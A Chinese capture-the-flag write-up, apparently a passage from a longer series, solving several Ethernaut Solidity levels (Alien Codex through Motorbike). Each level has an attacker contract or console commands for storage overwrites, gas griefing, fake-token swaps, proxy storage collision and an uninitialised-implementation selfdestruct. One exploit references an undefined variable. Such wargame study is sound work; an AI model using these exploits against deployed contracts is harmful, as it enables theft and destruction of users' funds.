调用web3的sendTransaction创建合约

```js
await web3.eth.sendTransaction({from: player, data: "0x600a600c600039600a6000f3602a60805260206080f3"})
etherscan上得到创建合约的地址
await contract.setSolver("<contract address>")
```

## Alien Codex

改变合约所有权

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

合约开头 import 了 [openzeppelin-contracts/Ownable.sol (github.com)](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol) 合约，同时也引入了一个 owner 变量

对于数组来说，首先占据一个插槽 slot p，这个插槽里是动态数组的长度，会把输入的`index`和`SLOAD(p)`的值进行比较，防止数组越界访问，然后数组的元素存储位置在 `keccak256(p)+index`

此处slot0是owner和contract，slot1是codex数组的长度，codex[i]的存储位置是 `keccak256(1) + i`

只要设计好 i 就能修改slot0

先调用retract()，让length下溢，变为2^256-1，这样就可以访问到全部的 storage 区域

要满足keccak256(1) + i = 0 = 2^256，得到 i = 2^256 - keccak256(1)

```js
pragma solidity ^0.6.0;

contract Exp {
  function calc() public view returns (uint) {
        bytes32 f3 = keccak256(abi.encode(bytes32(uint(1))));
        return 2**256-1 -uint(f3) +1;
  }
}
//得到35707666377435648211887908874984608119992236509074197713628505308453184860938
```

控制台执行

```js
await contract.retract()//长度下溢
await web3.eth.getStorageAt(instance, 1, function(x, y) {console.info(y)})//查看长度
'0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
await contract.revise("xxx","0x000000000000000000000001<player.address>")//改变owner
```

## Denial

阻止向owner转账

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

这题的withdraw()函数分别向partner和owner转账1%，要做的是阻止owner转走

只要在partner的转帐中把gas耗尽，那么owner就无法转账。

在partner的receive函数中使用assert(false)，会depletes all gas

```js
pragma solidity ^0.6.0;

interface Denial {
    function setWithdrawPartner(address _partner) external ;
    // withdraw 1% to recipient and 1% to owner
    function withdraw() external ;
    // convenience function
    function contractBalance() external view returns (uint) ;
}

contract Attack {
    Denial instance;
    constructor(address _instance) public {
          instance = Denial(_instance);
    }
    function hack() public {
          instance.setWithdrawPartner(address(this));
          instance.withdraw();
    }
    receive() external payable{
        assert(false);
    }
}
```

或者重入攻击耗尽gas（未尝试，别的师傅的wp说没打出来）

## Shop

从商店以低于要求的价格购买商品

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

和Elevator那题一样，两次调用price()函数返回值不一样即可，第一次返回大于100的数，第二次返回小于100的数

不同的是这里是view函数，不能改变变量

发现在第一次调用后改变了`bool public isSold`为true，因此可以根据isSold的状态来决定返回值

```js
pragma solidity ^0.6.0;

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
  }
}
contract Exp {
    Shop instance;
    constructor(address _instance) public {
        instance = Shop(_instance);
    }

    function price() view public returns (uint){
        if(instance.isSold() == true) {
            return 99;
        }
        else {
            return 101;
        }
    }
    function attack() public {
        instance.buy();
    }
}
```

## Dex

目的是把题目账户上的某个 token 清零

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract Dex is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

有两种代币token1和token2，玩家各有10个，题目账户上各有100个，目的是把题目账户上的某个 token 清零

题目的 Dex 合约主要提供了 swap 这个函数用来在两个 token 间交换金额

调用swap时，玩家给题目账户一定数量的代币，题目账户根据比例给玩家兑换相应数量的另一种代币

兑换的比例由当前题目账户上两种代币的比例决定

比如题目账户 token1: token2=10:1，那么玩家10枚token1才能换1枚token2

这个机制本身就是有问题的，来回兑换几次，就能兑空其中一个token

```
                  DEX       |        player  
            token1 - token2 | token1 - token2
            ----------------------------------
初始情况	   100     100   |   10      10
第1次兑换      110     90    |   0       20    
第2次兑换      86      110   |   24      0    
第3次兑换      110     80    |   0       30    
第4次兑换      69      110   |   41      0    
第5次兑换      110     45    |   0       65   
第6次兑换      0       90    |   110     20
```

控制台操作

```js
await contract.approve(instance, 1000)
//先approve增加allowances，后面transferFrom要用
const token1 = await contract.token1()
const token2 = await contract.token2()
//获取两个token地址
await contract.swap(token1, token2, 10)
await contract.swap(token2, token1, 20)
await contract.swap(token1, token2, 24)
await contract.swap(token2, token1, 30)
await contract.swap(token1, token2, 41)
await contract.swap(token2, token1, 45)
//来回兑换，直到换空一个
```

然而`await contract.approve(instance, 1000)` 这步有问题，MetaMask会卡住一直转圈圈

github上找到issue: [Level 22 Dex - Sentry 429 (Too Many Requests) in MetaMask · Issue #365 · OpenZeppelin/ethernaut](https://github.com/OpenZeppelin/ethernaut/issues/365)

解决方法是把`contract SwappableToken`在Remix ide编译

用`At Address`分别部署在两个token的位置，然后分别调用`approve()`

## Dex Two

清空题目账户的两种token

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract DexTwo is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

由于`swap()`缺少了指定token的判断条件，可以自己构造一个新的 IERC20 的 token 参与进来

大量铸币approve后随便换就行，可以参考[Ethernaut Hacks Level 23: Dex Two - DEV Community](https://dev.to/nvn/ethernaut-hacks-level-23-dex-two-4424)

然而有一个更骚的，override `transferFrom()` 直接返回true，相当于白嫖不用付出代币，也不用approve

override  `balanceOf()` 使其始终返回 1，这样调用 `swap(new_token, to_token, 1)`时，`getSwapAmount()`的分母就为1，就能转出所有to代币，同时也能通过require

```js
pragma solidity ^0.6.0;

contract DexTwo {
  function swap(address from, address to, uint amount) public {}
}

contract EvilToken {
    function balanceOf(address account) public view returns (uint256) {
        return 1;
    }
    function transferFrom(address, address, uint256) public returns (bool) {
        return true;
    }
}

contract Exploit {
    address eviltoken;
    DexTwo instance;
    constructor(address _instance, address _eviltoken) public {
        instance = DexTwo(_instance);
        eviltoken = _eviltoken;
    }
    function exp(address token) public {
        challenge.swap(eviltoken, token, 1);
    }
}
```

分别对题目的两个token地址调用exp()即可

## Puzzle Wallet

目的是改变代理合约的admin为player

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/proxy/UpgradeableProxy.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    using SafeMath for uint256;
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] = balances[msg.sender].add(msg.value);
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender].sub(value);
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

参考：[Ethernaut Level 24: Puzzle Wallet (hashnode.dev)](https://baguioni.hashnode.dev/ethernaut-level-24-puzzle-wallet)

这里是代理合约 PuzzleProxy 和实际的逻辑合约 PuzzleWallet

相当于是用着代理合约的存储，跑着逻辑合约的代码。何尝不是一种ntr

会有存储碰撞的问题。

由于代理的 pendingAdmin 和 钱包的 owner 位于同一个slot

所以先调用 proposeNewAdmin 改掉代理的 pendingAdmin，这样在钱包看来，owner也改变了

这里虽然实例提供的`web3js`的 API 没有proposeNewAdmin方法，不能直接调用，但是可以编码后用web3的发送交易的方式调用

```js
await web3.eth.getStorageAt(instance, 0)  // owner
//'0x000000000000000000000000<level address>'
data = await contract.methods["proposeNewAdmin(address)"].request(player).then(v => v.data)
//得到calldata '0xa6376746000000000000000000000000<player address>'
web3.eth.sendTransaction({from: player, to: instance, data: data})
await contract.owner()//目前owner为player
```

目的是改变代理合约的admin，和钱包合约的maxBalance位于同一个位置，可以用 setMaxBalance() 设置

setMaxBalance 只有当合约的余额为0时才能设置新maxBalance，那么接下来考虑先把账户余额清空才能设置

```js
await contract.addToWhitelist(player)//设置白名单
await web3.utils.fromWei(await web3.eth.getBalance(instance))
//账户余额 0.001 eth
```

注意到multicall函数，可以一次执行多个transaction

multicall从数据中提取 `function selector`（签名的前 4 个字节），并确保deposit只调用一次

但可以通过 multicall 中执行两个 multicall，每个 multicall 分别调用一次 deposit

这样只用一份msg.value，能让玩家账户余额加两次

构造calldata

```js
// deposit() method
depositData = await contract.methods["deposit()"].request().then(v => v.data)

// multicall() method with param of deposit function call signature
multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
//'0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000'
await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
```

这时候合约账户有0.002 eth，balances[player] 有 0.002 eth，直接全转，然后设置maxBalance即可

```js
await contract.execute(player, toWei('0.002'), 0x0)
await contract.setMaxBalance(player)
```

解出题目后也是给出了问题所在，存储冲突和迭代消耗eth的问题：

> Frequently, using proxy contracts is highly recommended to bring upgradeability features and reduce the deployment's gas cost. However, developers must be careful not to introduce storage collisions, as seen in this level.
>
> Furthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, `msg.value` will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple `delegatecall`s to a function that looks safe on its own could lead to unwanted transfers of ETH, as `delegatecall`s keep the original `msg.value` sent to the contract.



## Motorbike

销毁Engine

```js
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

参考：[Ethernaut Level 25: Motorbike (hashnode.dev)](https://baguioni.hashnode.dev/ethernaut-level-25-motorbike)

目的是更新为恶意合约并调用selfdestruct销毁Engine，可以通过 upgradeToAndCall 函数来载入恶意合约并调用

这需要通过 _authorizeUpgrade 函数的检查，也就是检查 sender == upgrader

可以通过 initialize() 函数来改变 upgrader 

那么需要通过 initialize() 函数的 initializer 修饰符，这里我们直接向Engine合约发送交易而不经过代理

而Engine逻辑合约没有初始化，这里未初始化能过修饰符

最终过程

先查看逻辑合约的地址，然后直接调用initialize()，然后调用upgradeToAndCall()更新并执行我们写的攻击合约自毁函数

```js
await web3.eth.getStorageAt(instance, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
engine = "engine_address"
initialize_data = web3.utils.sha3("initialize()").slice(0, 10)
await web3.eth.sendTransaction({from: player, to: engine, data: initialize_data})//改变upgrader

upgradeSignature = {
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: 'newImplementation'
        },
        {
            type: 'bytes',
            name: 'data'
        }
    ]
}

exp = "attack_contract_address"

destruct_data = web3.utils.sha3("destruct()").slice(0, 10)
params = [exp, destruct_data]
upgrade_data = web3.eth.abi.encodeFunctionCall(upgradeSignature, params)
await web3.eth.sendTransaction({from: player, to: engine, data: upgrade_data})
```

恶意合约

```js
contract Exploit {
    function destruct() public {
        selfdestruct(payable(0));
    }
}
```



waiting to update……

